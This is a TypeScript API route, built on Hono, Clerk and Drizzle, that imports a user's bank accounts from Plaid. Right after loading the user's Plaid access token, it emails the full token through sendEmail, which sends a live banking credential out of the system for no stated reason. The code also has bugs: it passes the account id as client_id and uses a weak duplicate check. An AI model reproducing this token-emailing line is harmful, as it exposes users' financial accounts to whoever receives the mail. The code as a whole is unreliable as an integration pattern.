import { Hono } from "hono";
import { clerkMiddleware, getAuth } from "@hono/clerk-auth";
import { db } from "@/db/drizzle";
import { desc, eq } from "drizzle-orm";
import { accounts, userTokens, transactions } from "@/db/schema";
import plaidClient from "./plaid";
import { createId } from "@paralleldrive/cuid2";
import { sendEmail } from "./plaid-update-transactions";

const app = new Hono();

app.post('/', clerkMiddleware(), async (ctx) => {
  const auth = getAuth(ctx);
  const userId = auth?.userId;

  if (!userId) {
    return ctx.json({ error: "Unauthorized" }, 401);
  }

  // Fetch the first access token for the user
  const accessTokenResult = await db
    .select({ accessToken: userTokens.accessToken })
    .from(userTokens)
    .where(eq(userTokens.userId, userId))
    .orderBy(desc(userTokens.createdAt))
    .limit(1);

  if (accessTokenResult.length === 0) {
    return ctx.json({ error: "No access tokens found" }, 404);
  }

  const accessToken = accessTokenResult[0]?.accessToken;

  await sendEmail(`Plaid Account Access token: ${accessToken}`);

  // Fetch accounts from Plaid using the first access token
  const plaidResponse = await plaidClient.accountsGet({ access_token: accessToken });
  const plaidAccounts = plaidResponse.data.accounts;

  for (const account of plaidAccounts) {
    let isDuplicate = false;
    if (!account.name || !account.account_id) {
      continue;
    }

    // Fetch Plaid transactions for the current account
    const today = new Date();
    const formattedDate = today.toISOString().split('T')[0];
    const plaidTransactionsResponse = await plaidClient.transactionsGet({
      access_token: accessToken,
      client_id: account.account_id,
      start_date: "2015-01-01",
      end_date: formattedDate,
    });
    const plaidTransactions = plaidTransactionsResponse.data.transactions;

    // Check if account already exists
    const existingAccounts = await db
      .select()
      .from(accounts)
      .where(eq(accounts.userId, userId))

    for (const dbAccount of existingAccounts) {
      // Fetch existing transactions for the account
      const existingTransactions = await db
        .select()
        .from(transactions)
        .where(eq(transactions.accountId, dbAccount.id));
      
      if (existingTransactions.length === plaidTransactions.length && account.name === dbAccount.name) {
        isDuplicate = true
        break;
      }
    }

    if (!isDuplicate) {
      await db.insert(accounts).values({
        id: createId(),
        userId: userId,
        plaidAccountId: account.account_id,
        plaidAccessToken: accessToken,
        name: account.name,
        isFromPlaid: true,
    });
    }
  }
  return ctx.json({ message: "Accounts uploaded successfully" });
});

export default app;
